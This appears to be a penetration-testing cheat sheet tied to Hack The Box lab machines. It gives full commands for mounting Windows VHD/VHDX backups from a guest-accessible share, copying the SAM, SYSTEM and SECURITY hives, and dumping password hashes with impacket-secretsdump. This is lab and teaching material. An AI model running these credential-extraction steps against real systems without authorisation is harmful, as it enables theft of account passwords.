
[HTB machine conceal](https://www.hackthebox.com/machines/conceal)
[HTB Bastion](https://www.hackthebox.com/machines/bastion)

## Overview

Virtual Hard Disk(VHD) and Virtual Hard Disk X (VHDX) files are used by windows for virtual machines, backups and system snapshots. These files can contain SAM and SYSTEM registry hives, which stores password hashes and other sensitive information.

Mounting VHD/VHDX files allows you to extract files and extraxt password hashes using tools like `impacket-secretsdump`

---

## Mounting VHD Files.

### Step 1: Install Necessary Tools

```bash
apt install libguestfs-tools cifs-utils
```

</br>

###  Step 2: Mount the Network Share

```bash
mount -t cifs //192.168.29.18/backup -o user=guest,password= /mnt/backup
```

</br>

###  Step 3: Mount the VHD file

```bash
guestmount --add /mnt/backup/vhdfile.vhd --inspector --ro /mnt/vhd -v
```

Alternatively, you can mount a specific VHD files directly:

```bash
guestmount -a /mnt/d1/system.vhd -i -r /mnt/d2 -v
```

</br>

### Step 4: Extract SAM and SYSTEM Files

```bash
cp /mnt/vhd/Windows/System32/config/SAM /tmp/
```

```bash
cp /mnt/vhd/Windows/System32/config/SYSTEM /tmp/

```

</br>

### Step 5: Extract Password Hashes

```bash
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM local
```

---

##  Mounting VHDX Files

### Step 1: Install Necessary Tools

```bash
apt install libguestfs-tools nautilus qemu-utils nbd-client
```

</br>

### Step 2: Load NBD Module

check if   `nbd` module is loaded 

```bash
lsmod | grep nbd
```

if not loaded, load it manually:

```bash
modprobe nbd
```

if needed unload and reload the module

```bash
rmmod nbd
```

```bash
modprobe nbd
```

</br>

### Step 3: Check Available NBD Devices

```bash
ls -l /dev/nbd*
```

</br>

### Step 4: Identify the Connected Drive

```bash
lsblk
```

```bash
blkid
```

</br>


### Step 5: Attach the VHDX file to NBD

```bash
qemu-nbd -c /dev/nbd0 /tmp/<name>.vhdx
```

</br>

### Step 6: Read Partition table

```bash
partprobe
```

```bash
partprobe /dev/nbd0
```

</br>


### Step 7: Confirm Partition Mapping

```bash
ls -l /dev/nbd*
```

</br>


### Step 8: Mount the Partition

```bash
mount -t ntfs /dev/nbd0p2 /mnt/d1
```

</br>

### Step 9: Extract SAM, SYSTEM and SECURITY Files


```bash
cp /mnt/d1/Windows/System32/config/SAM /tmp
```

```bash
cp /mnt/d1/Windows/System32/config/SYSTEM /tmp
```

```bash
cp /mnt/d1/Windows/System32/config/SECURITY /tmp
```

</br>

### Step 10: Extract Password Hashes


```bash
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM -security /tmp/SECURITY local
```